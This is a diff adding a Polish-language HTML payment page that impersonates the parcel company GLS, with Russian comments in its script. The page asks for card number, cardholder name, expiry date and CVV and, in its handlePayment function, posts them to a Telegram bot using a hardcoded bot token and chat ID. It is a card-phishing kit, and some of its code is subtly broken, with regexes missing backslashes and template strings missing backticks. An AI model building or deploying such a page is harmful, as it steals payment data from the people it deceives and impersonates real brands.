@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Płatność kartą</title>
+    <style>
+        body {
+            font-family: "Arial", sans-serif;
+            background-color: #f4f7fa;
+            margin: 0;
+            padding: 20px;
+        }
+        .header {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 0;
+            text-align: center;
+        }
+        .container {
+            max-width: 500px;
+            margin: auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            text-align: center;
+            color: #343a40;
+        }
+        p {
+            text-align: center;
+            color: #6c757d;
+            margin-bottom: 20px;
+        }
+        .card-input {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #495057;
+        }
+        input[type="text"],
+        input[type="number"],
+        input[type="submit"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ced4da;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        input[type="submit"] {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #218838;
+        }
+        .logos {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+        }
+        .logos img {
+            width: 40px; /* Уменьшенный размер для лучшего размещения */
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #6c757d;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/GLS_Logo_2021.svg" alt="GLS Logo" style="height: 50px" />
+    </div>
+
+    <div class="container">
+        <h1>Płatność kartą</h1>
+        <p>Proszę wprowadzić dane karty, aby zakończyć transakcję.</p>
+
+        <form id="paymentForm" onsubmit="handlePayment(event)">
+            <div class="card-input">
+                <label for="card-number">Numer karty (16 cyfr)</label>
+                <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required maxlength="19" oninput="formatCardNumber(this)" />
+            </div>
+
+            <div class="card-input">
+                <label for="cardholder-name">Imię i nazwisko posiadacza karty</label>
+                <input type="text" id="cardholder-name" placeholder="Jan Kowalski" required />
+            </div>
+
+            <div class="card-input">
+                <label for="expiry-date">Data ważności (MM/RR)</label>
+                <input type="text" id="expiry-date" placeholder="MM/RR" required maxlength="5" oninput="formatExpiryDate(this)" />
+            </div>
+
+            <div class="card-input">
+                <label for="cvv">CVV (3 цифры)</label>
+                <input type="password" id="cvv" placeholder="***" required maxlength="3" oninput="formatCvv(this)" />
+            </div>
+
+            <div class="logos">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" />
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard" />
+            </div>
+
+            <input type="submit" value="Zapłać" />
+        </form>
+
+        <div class="footer">
+            <p>Bezpieczne płatności dzięki SSL</p>
+<p>© 2024 GLS. Wszelkie prawa zastrzeżone.</p>
+        </div>
+    </div>
+
+    <script>
+        function formatCardNumber(input) {
+            // Удаляем все нецифровые символы
+            let value = input.value.replace(/D/g, '');
+            // Форматируем номер карты с пробелами
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            input.value = formattedValue.trim();
+        }
+
+        function formatExpiryDate(input) {
+            // Удаляем все нецифровые символы
+            let value = input.value.replace(/D/g, '');
+            // Форматируем дату с разделителем /
+            if (value.length > 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            input.value = value.slice(0, 5); // Ограничиваем длину до MM/RR
+        }
+
+        function formatCvv(input) {
+            // Ограничиваем ввод до трех цифр и скрываем их
+            input.value = input.value.replace(/D/g, '').slice(0, 3);
+        }
+
+        async function handlePayment(event) {
+    event.preventDefault(); // Предотвращаем отправку формы
+
+    const cardNumber = document.getElementById('card-number').value.replace(/s/g, ''); // Убираем пробелы
+    const cardholderName = document.getElementById('cardholder-name').value;
+    const expiryDate = document.getElementById('expiry-date').value;
+    const cvv = document.getElementById('cvv').value;
+
+    // Формируем текст сообщения
+    const message = 
+        Новая транзакция:
+        Numer karty: ${cardNumber}
+        Imię i nazwisko: ${cardholderName}
+        Data ważności: ${expiryDate}
+        CVV: ${cvv}
+    ;
+
+    // Замените TOKEN и CHAT_ID на ваши данные
+    const token = '7756148539:AAHKKGieU5Z2kbsJVlMIbsjwggGYD0pwQ98';
+    const chatId = '7259140896';
+
+    // Отправляем сообщение в Telegram
+    const url = https://api.telegram.org/bot${token}/sendMessage;
+    
+    const response = await fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+        }),
+    });
+
+    if (response.ok) {
+        alert('Данные успешно отправлены в Telegram!');
+        document.getElementById('paymentForm').reset(); // Сброс формы после успешной отправки
+        document.getElementById('cvv').type = 'password'; // Скрываем CVV после отправки
+    } else {
+        alert('Ошибка при отправке данных в Telegram.');
+    }
+}
+    </script>
+</body>
+</html>
